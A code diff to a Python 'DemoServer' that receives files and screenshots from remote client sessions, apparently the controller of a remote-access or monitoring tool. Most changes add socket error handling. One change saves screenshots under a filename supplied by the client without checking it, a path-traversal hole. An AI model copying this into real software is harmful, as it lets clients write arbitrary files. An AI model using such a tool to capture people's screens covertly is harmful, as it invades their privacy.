@@ -563,7 +563,11 @@ class DemoServer:
                                     "message": "file_received",
                                     "filename": filename
                                 }).encode('utf-8')
-                                session.client_socket.send(ack)
+                                try:
+                                    session.client_socket.send(ack)
+                                except (BrokenPipeError, ConnectionResetError, OSError):
+                                    self.log(f"[!] Failed to send file ack to session {session.session_id}")
+                                    session.connected = False
                                 session.pending_file = None
                         else:
                             # We are expecting JSON - try to decode one message
@@ -695,9 +699,13 @@ class DemoServer:
             self.log(f"    Type: {file_type}")
 
             ack = json.dumps({"type": "ack", "message": "ready_to_receive"}).encode('utf-8')
-            session.client_socket.send(ack)
-            with self.lock:
-                session.bytes_sent += len(ack)
+            try:
+                session.client_socket.send(ack)
+                with self.lock:
+                    session.bytes_sent += len(ack)
+            except (BrokenPipeError, ConnectionResetError, OSError):
+                self.log(f"[!] Failed to send ack to session {session.session_id}")
+                session.connected = False
 
         elif msg_type == "file_transfer_complete":
             self.log(f"[+] File transfer complete from session {session.session_id}")
@@ -729,36 +737,24 @@ class DemoServer:
             self.log_to_file(message, session.address)
 
         elif msg_type == "screenshot_data":
-            # Handle screenshot image data
+            # Handle screenshot image data (sent as base64 in a single JSON message)
             image_b64 = message.get("data", "")
             if image_b64:
                 try:
                     image_bytes = base64.b64decode(image_b64)
                     timestamp = int(time.time())
-                    filename = f"screenshot_{session.session_id}_{timestamp}.png"
+                    # Use filename from client if provided, otherwise generate one
+                    filename = message.get("filename", f"screenshot_{session.session_id}_{timestamp}.jpg")
                     filepath = os.path.join(IMAGES_DIR, filename)
                     with open(filepath, 'wb') as f:
                         f.write(image_bytes)
                     self.log(f"[+] Screenshot saved: {filepath} ({len(image_bytes)} bytes)")
                     with self.lock:
                         session.total_screenshots_received += 1
-                        # Also count as image for backward compatibility with stats
                         session.total_images_received += 1
-                    # Optional: save metadata
-                    meta = {
-                        "session_id": session.session_id,
-                        "timestamp": timestamp,
-                        "width": message.get("width", 0),
-                        "height": message.get("height", 0),
-                        "format": message.get("format", "png")
-                    }
-                    meta_file = os.path.join(DOCS_DIR, f"screenshot_{session.session_id}_{timestamp}.json")
-                    with open(meta_file, 'w') as f:
-                        json.dump(meta, f, indent=2)
-                    self.log(f"    [+] Metadata saved to: {meta_file}")
+                    self.log_to_file(message, session.address)
                 except Exception as e:
                     self.log(f"[!] Failed to process screenshot: {e}")
-            self.log_to_file(message, session.address)
 
         # === v4.0 NEW MESSAGE HANDLERS ===
 
